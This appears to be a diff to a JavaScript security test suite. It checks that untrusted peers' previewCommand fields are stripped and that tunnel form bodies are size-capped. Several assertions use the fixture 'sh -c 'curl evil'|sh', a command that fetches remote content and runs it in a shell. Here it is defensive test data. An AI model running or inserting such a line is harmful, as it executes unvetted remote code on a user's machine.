@@ -416,7 +416,10 @@ function middlewareDeps(state, tunnelMode) {
   assert.equal(tunneled.contract.deliverables[0].previewCommand, undefined, "gate-cookie tunnel visitor (L0): previewCommand stripped");
   const keptLan = mkBody();
   taskRoutes.stripPreviewCommandsForUntrustedPeer(keptLan, lan, false);
-  assert.equal(keptLan.contract.deliverables[0].previewCommand, "sh -c 'curl evil'|sh", "LAN peer (the owner's own worker) keeps its previewCommand");
+  assert.equal(keptLan.contract.deliverables[0].previewCommand, undefined, "LAN peer in L0 is unpaired too (2026.11.12 review): previewCommand stripped");
+  const keptLanProtected = mkBody();
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(keptLanProtected, lan, true);
+  assert.equal(keptLanProtected.contract.deliverables[0].previewCommand, "sh -c 'curl evil'|sh", "LAN peer with protection on (authenticated) keeps its previewCommand");
   const keptLoopback = mkBody();
   taskRoutes.stripPreviewCommandsForUntrustedPeer(keptLoopback, loopback, false);
   assert.equal(keptLoopback.contract.deliverables[0].previewCommand, "sh -c 'curl evil'|sh", "loopback peer keeps its previewCommand");
@@ -434,5 +437,21 @@ function middlewareDeps(state, tunnelMode) {
   assert.match(rt, /handleTaskResultRequest\(ctx\.deps, ctx\.req, ctx\.res, ctx\.pathname, ctx\.peer\)/, "route-table passes the peer to the result handler");
 }
 
-console.log("test-security-clawhub-r2: ok (R2 self-hosted/WS origin/preview stripping, R3 CSP + release build, R4 cross-site guard/last-device/body limits, R5 token redaction, R6 untrusted-peer previewCommand strip)");
+// ---------------------------------------------------------------------------
+// 10. ClawHub rescan 2026.11.12 (R7): public tunnel form endpoints have a
+//     bounded body; in L0 only loopback may supply a previewCommand.
+// ---------------------------------------------------------------------------
+{
+  const protocolMod = await dist("protocol.js");
+  assert.equal(protocolMod.MAX_FORM_BODY_BYTES, 64 * 1024, "form bodies (gate / connector tokens) are capped at 64 KiB");
+  const tr = fs.readFileSync(path.join(projectRoot, "src", "src", "controller", "tunnel-routes.ts"), "utf8");
+  const fnIdx = tr.indexOf("async function readFormBody(");
+  const boundIdx = tr.indexOf("if (total > MAX_FORM_BODY_BYTES)");
+  const pushIdx = tr.indexOf("chunks.push(buf)");
+  assert.ok(fnIdx > 0 && boundIdx > fnIdx && boundIdx < pushIdx, "readFormBody checks the byte bound BEFORE buffering each chunk");
+  assert.match(tr, /throw new BodyTooLargeError\(MAX_FORM_BODY_BYTES\)/, "an oversized form aborts with BodyTooLargeError");
+  assert.equal((tr.match(/sendError\(res, 413, err\.message\)/g) ?? []).length, 2, "both readFormBody call sites answer oversized bodies with 413");
+}
+
+console.log("test-security-clawhub-r2: ok (R2 self-hosted/WS origin/preview stripping, R3 CSP + release build, R4 cross-site guard/last-device/body limits, R5 token redaction, R6/R7 previewCommand strip (loopback-only in L0) + bounded tunnel forms)");
 process.exit(0);
